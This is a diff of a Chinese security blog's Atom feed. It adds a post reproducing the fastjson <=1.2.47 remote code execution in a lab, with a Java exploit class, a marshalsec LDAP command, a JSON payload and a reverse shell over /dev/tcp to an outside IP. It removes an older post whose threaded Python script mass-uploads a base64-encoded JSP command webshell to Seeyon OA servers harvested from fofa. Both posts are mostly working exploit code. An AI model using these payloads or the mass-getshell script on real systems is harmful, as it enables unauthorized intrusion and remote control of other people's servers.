@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>http://www.svenbeast.com/</id>
     <title>斯文beast</title>
-    <updated>2019-10-20T13:03:22.695Z</updated>
+    <updated>2019-10-21T13:19:42.630Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="http://www.svenbeast.com/"/>
     <link rel="self" href="http://www.svenbeast.com//atom.xml"/>
@@ -10,6 +10,154 @@
     <logo>http://www.svenbeast.com//images/avatar.png</logo>
     <icon>http://www.svenbeast.com//favicon.ico</icon>
     <rights>All rights reserved 2019, 斯文beast</rights>
+    <entry>
+        <title type="html"><![CDATA[fastjson<=1.2.47漏洞复现]]></title>
+        <id>http://www.svenbeast.com//post/c0VE5mjC-</id>
+        <link href="http://www.svenbeast.com//post/c0VE5mjC-">
+        </link>
+        <updated>2019-10-21T02:30:23.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="0x01-背景">0x01 背景</h3>
+<pre><code>为以后遇到java环境增加测试项做准备，防止一脸懵逼情况发生🙀，并且一般到时再看为时已晚，so先下手为强😇。
+</code></pre>
+<h3 id="0x02-网络环境">0x02 网络环境</h3>
+<pre><code>攻击机：
+os:windows10
+服务器：
+os:kali虚拟机，ip:192.168.124.55，jdk版本:jdk8u181，中间件:tomcat9
+目标机：
+os:ubuntu虚拟机，ip：172.21.139.103，中间件：tomcat9，jdk版本:jdk8u181
+</code></pre>
+<h3 id="0x03-环境搭建">0x03 环境搭建</h3>
+<pre><code>unbutu&amp;kali安装jdk：jdk8u181
+    链接: https://pan.baidu.com/s/1nI-JT93vjcA9--7fb0fhqw&amp;shfl=shareset 提取码: sven
+tomcat下载：https://mirrors.tuna.tsinghua.edu.cn/apache/tomcat/tomcat-9/v9.0.27/bin/apache-tomcat-9.0.27.tar.gz
+fastjson1.2.47：
+    链接: https://pan.baidu.com/s/1C022L851nIkq4zy5hiG_TA&amp;shfl=shareset 提取码: sven
+工具：marshalsec，需要用mvn打包一下，github：https://github.com/mbechler/marshalsec
+    链接(已打包好): https://pan.baidu.com/s/1kT9vwhNDDdiJ3dL9BS3U4w&amp;shfl=shareset 提取码: sven
+</code></pre>
+<ul>
+<li>mvn打包截图及使用命令<br>
+<img src="http://www.svenbeast.com//post-images/1571644519217.png" alt=""></li>
+<li>细节配置就不说了，大概就是服务器开启ldap并配置web能访问到exp，靶机安装好jdk放入fastjson环境，然后攻击机使用poc进行请求，完事</li>
+</ul>
+<p>访问靶机界面：<br>
+<img src="http://www.svenbeast.com//post-images/1571661306111.png" alt=""></p>
+<h3 id="0x04-漏洞利用">0x04 漏洞利用</h3>
+<p>Exploit:</p>
+<pre><code>import java.io.BufferedReader;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+
+public class Exploit{
+    public Exploit() throws Exception {
+        Process p = Runtime.getRuntime().exec(&quot;touch /tmp/fastjson.test&quot;);
+        InputStream is = p.getInputStream();
+        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
+
+        String line;
+        while((line = reader.readLine()) != null) {
+            System.out.println(line);
+        }
+
+        p.waitFor();
+        is.close();
+        reader.close();
+        p.destroy();
+    }
+
+    public static void main(String[] args) throws Exception {
+    }
+}
+</code></pre>
+<ul>
+<li>1.编译一下Exploit.java,生成Exploit.class，将2个文件放入服务器webapps/fastjson下<br>
+<img src="http://www.svenbeast.com//post-images/1571662553861.png" alt=""></li>
+<li>2.服务器使用marshalsec开启ldap服务：</li>
+</ul>
+<pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.124.55:8080/fastjson/#Exploit 8088
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1571661251212.png" alt=""></figure>
+<ul>
+<li>3.查看一下靶机源码，发现参数name和age，构造一下，回显正常，<br>
+ps:真实环境中这些都是目标机自带的，找到提交json的地方构造poc即可<br>
+<img src="http://www.svenbeast.com//post-images/1571641485626.png" alt=""><br>
+<img src="http://www.svenbeast.com//post-images/1571641954462.png" alt=""></li>
+<li>4.放上poc，查看靶机是否成功执行命令</li>
+</ul>
+<pre><code>POST /fastjson/ HTTP/1.1
+Host: 192.168.124.34:8080
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Content-Length: 256
+
+{
+  &quot;name&quot;: {
+    &quot;@type&quot;: &quot;java.lang.Class&quot;,
+    &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;
+  },
+  &quot;x&quot;: {
+    &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+    &quot;dataSourceName&quot;: &quot;ldap://192.168.124.55:8088/fastjson/Exploit&quot;,
+    &quot;autoCommit&quot;: true
+  }
+}
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1571661421637.png" alt=""></figure>
+<ul>
+<li>
+<p>5.服务器的Ldap已接收到请求，靶机的/tmp/fastjson.test文件也已存在，命令成功执行</p>
+<p><img src="http://www.svenbeast.com//post-images/1571663164486.png" alt=""><br>
+<img src="http://www.svenbeast.com//post-images/1571663218133.png" alt=""></p>
+</li>
+</ul>
+<h3 id="0x05-反弹shell">0x05 反弹shell</h3>
+<ul>
+<li>坑点之一，java反弹shell，无法直接使用bash -i &gt;&amp; /dev/tcp/119.28.130.53/18888 0&gt;&amp;1</li>
+</ul>
+<pre><code>反弹shell_Exp:
+import java.io.BufferedReader;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+
+public class Exploit{
+    public Exploit() throws Exception {
+        Process p = Runtime.getRuntime().exec(new String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.124.5/888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;});
+        InputStream is = p.getInputStream();
+        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
+
+        String line;
+        while((line = reader.readLine()) != null) {
+            System.out.println(line);
+        }
+
+        p.waitFor();
+        is.close();
+        reader.close();
+        p.destroy();
+    }
+
+    public static void main(String[] args) throws Exception {
+    }
+}
+
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="http://www.svenbeast.com//post-images/1571663527253.png" alt=""></figure>
+<h3 id="0x06-坑点">0x06 坑点</h3>
+<ul>
+<li>1.未编译Exploit.java，只放入服务器1个.java文件</li>
+<li>2.java反弹shell无法直接使用linux命令反弹</li>
+<li>3.jdk版本需要注意，下方图片jdk版本不存在此漏洞</li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="http://www.svenbeast.com//post-images/1571663940441.png" alt=""></figure>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[Joomla 3.4.6-RCE漏洞利用]]></title>
         <id>http://www.svenbeast.com//post/WH877Va6k</id>
@@ -1084,104 +1232,6 @@ https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=69
 </ul>
 <h3 id="ps因博客重建特意将本人文章从tools转移回来如有影响可联系删帖">PS：因博客重建，特意将本人文章从Tools转移回来，如有影响，可联系删帖</h3>
 <p>文章链接（来点个顶可好~）：https://www.t00ls.net/thread-51968-1-1.html</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[致远OA批量getshell刷SRC]]></title>
-        <id>http://www.svenbeast.com//post/zhi-yuan-oa-pi-liang-getshell-shua-src</id>
-        <link href="http://www.svenbeast.com//post/zhi-yuan-oa-pi-liang-getshell-shua-src">
-        </link>
-        <updated>2019-06-27T00:01:02.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="步骤1利用fofa搜索目标然后保存成1html网页到fofapy同一路径下">步骤1：利用fofa搜索目标，然后保存成1.html网页到fofa.py同一路径下</h3>
-<p>usage：ctrl+s</p>
-<figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1563442685193.png" alt=""></figure>
-<h3 id="步骤2用fofapy-导出域名和ip因为fofa的导出和api都要rmb脚本写的不好见谅了但胜在比手动快一些-">步骤2：用fofa.py 导出域名和ip，因为fofa的导出和api都要RMB，脚本写的不好，见谅了，但胜在比手动快一些 -.- !</h3>
-<p>usage：python2 fofa.py</p>
-<pre><code>#coding=utf-8
-#python2
-#By sven'beast
-
-import sys
-import requests
-from lxml import etree
-
-
-# def check_url(url):
-
-with open('1.html','r') as f:
-        text=f.read()
-        html = etree.HTML(text)
-        results = html.xpath('//*[@id=&quot;ajax_content&quot;]/div/div/div/a')
-        results2 = html.xpath(&quot;//div[@class='ip-no-url']//text()&quot;)
-        with open('url.txt','a') as s:
-                for i in results:
-                        print i.get('href').split('/')[2]
-                        url=i.get('href').split('/')[2]
-                        s.write('http://'+url)
-                        s.write('\n')
-        with open('url.txt','a') as s:
-                for i in results2:
-                        ip='http://'+i.strip()
-                        print(ip)
-                        s.write(ip)
-                        s.write('\n')
-</code></pre>
-<figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1563442574393.png" alt=""></figure>
-<h3 id="步骤3用pocpy检测一下生成successtxt这里注意的是会直接写入cmd马敏感目标请自己注意">步骤3：用poc.py检测一下，生成success.txt，这里注意的是，会直接写入cmd马，敏感目标请自己注意。</h3>
-<p>ps：这个脚本弄了很长时间，没办法，菜~，requests.post这里总是报错，抓狂，也没人可以问 -.- !</p>
-<p>usage：python3 poc.py</p>
-<pre><code>#!/usr/bin/env python3
-#-*- encoding:utf-8 -*-
-#By sven'beast
-
-import base64
-import requests
-import threading
-import queue
-
-q=queue.Queue()
-
-file=open('url.txt')
-for x in file.readlines():
-        q.put(x.strip())
-
-def scan():
-        while not q.empty():
-                url=q.get()
-                headers={'Content-Type':'text/xml','User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:52.0) Gecko/20100101 Firefox/52.'}
-                post_payload1=&quot;REJTVEVQIFYzLjAgICAgIDM1NSAgICAgICAgICAgICAwICAgICAgICAgICAgICAgNjY2ICAgICAgICAgICAgIERCU1RFUD1PS01MbEtsVg0KT1BUSU9OPVMzV1lPU1dMQlNHcg0KY3VycmVudFVzZXJJZD16VUNUd2lnc3ppQ0FQTGVzdzRnc3c0b0V3VjY2DQpDUkVBVEVEQVRFPXdVZ2hQQjNzekIzWHdnNjYNClJFQ09SRElEPXFMU0d3NFNYekxlR3c0VjN3VXczelVvWHdpZDYNCm9yaWdpbmFsRmlsZUlkPXdWNjYNCm9yaWdpbmFsQ3JlYXRlRGF0ZT13VWdoUEIzc3pCM1h3ZzY2DQpGSUxFTkFNRT1xZlRkcWZUZHFmVGRWYXhKZUFKUUJSbDNkRXhReVlPZE5BbGZlYXhzZEdoaXlZbFRjQVRkTjFsaU40S1h3aVZHemZUMmRFZzYNCm5lZWRSZWFkRmlsZT15UldaZEFTNg0Kb3JpZ2luYWxDcmVhdGVEYXRlPXdMU0dQNG9FekxLQXo0PWl6PTY2DQo8JUAgcGFnZSBsYW5ndWFnZT0iamF2YSIgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiIHBhZ2VFbmNvZGluZz0iVVRGLTgiJT48JSFwdWJsaWMgc3RhdGljIFN0cmluZyBleGN1dGVDbWQoU3RyaW5nIGMpIHtTdHJpbmdCdWlsZGVyIGxpbmUgPSBuZXcgU3RyaW5nQnVpbGRlcigpO3RyeSB7UHJvY2VzcyBwcm8gPSBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKGMpO0J1ZmZlcmVkUmVhZGVyIGJ1ZiA9IG5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIocHJvLmdldElucHV0U3RyZWFtKCkpKTtTdHJpbmcgdGVtcCA9IG51bGw7d2hpbGUgKCh0ZW1wID0gYnVmLnJlYWRMaW5lKCkpICE9IG51bGwpIHtsaW5lLmFwcGVuZCh0ZW1wKyJcbiIpO31idWYuY2xvc2UoKTt9IGNhdGNoIChFeGNlcHRpb24gZSkge2xpbmUuYXBwZW5kKGUuZ2V0TWVzc2FnZSgpKTt9cmV0dXJuIGxpbmUudG9TdHJpbmcoKTt9ICU+PCVpZigiYXNhc2QzMzQ0NSIuZXF1YWxzKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJwd2QiKSkmJiEiIi5lcXVhbHMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKSl7b3V0LnByaW50bG4oIjxwcmU+IitleGN1dGVDbWQocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKSArICI8L3ByZT4iKTt9ZWxzZXtvdXQucHJpbnRsbigiOi0pIik7fSU+NmU0ZjA0NWQ0Yjg1MDZiZjQ5MmFkYTdlMzM5MGQ3Y2U=&quot;
-                post_payload1 = base64.b64decode(post_payload1)
-                requests.packages.urllib3.disable_warnings()
-                try:
-                        post=requests.post(url=url+'/seeyon/htmlofficeservlet',data=post_payload1,headers=headers,verify=False,timeout=10)
-                        r = requests.get(url=url+'/seeyon/test123456.jsp?pwd=asasd3344&amp;cmd=cmd+/c+echo%20unsafe',headers=headers,timeout=10,verify=False)
-                        if 'unsafe' in r.text:
-                                print ('Getshell Success:'+url+'/seeyon/test123456.jsp?pwd=asasd3344&amp;cmd=cmd+/c+echo%20unsafe'+'\n')
-                                with open('success.txt','a') as f:
-                                        f.write(url+'/seeyon/test123456.jsp?pwd=asasd3344&amp;cmd=cmd+/c+echo%20unsafe'+'\n')
-                        else:
-                                print ('Getshell fail:'+url+'\n')
-                except:
-                        print ('Getshell fail:'+url+ ' time out.'+'\n')
-
-th=[]
-th_num=10
-for x in range(th_num):
-        t=threading.Thread(target=scan)
-        th.append(t)
-for x in range(th_num):
-        th[x].start()
-for x in range(th_num):
-        th[x].join()
-</code></pre>
-<figure data-type="image" tabindex="3"><img src="http://www.svenbeast.com//post-images/1563442604575.png" alt=""></figure>
-<h3 id="步骤4打开successtxt复制链接去执行命令吧提交src当然我肯定抢不过各位大佬的">步骤4：打开success.txt复制链接去执行命令吧，提交SRC，当然我肯定抢不过各位大佬的。</h3>
-<figure data-type="image" tabindex="4"><img src="http://www.svenbeast.com//post-images/1563442600570.png" alt=""></figure>
-<p>代码已经提供了，可以自己复制，同时也分享了百度云和附件</p>
-<p>链接: https://pan.baidu.com/s/1xfcxfk16PanOtjUBJmKdxQ 提取码: xrrq<br>
-解压密码：svenbeast</p>
-<h3 id="ps因博客重建特意将本人文章从tools转移回来如有影响可联系删帖">PS：因博客重建，特意将本人文章从Tools转移回来，如有影响，可联系删帖</h3>
-<p>文章链接（来点个顶可好~）：https://www.t00ls.net/thread-51610-1-1.html</p>
 ]]></content>
     </entry>
 </feed>
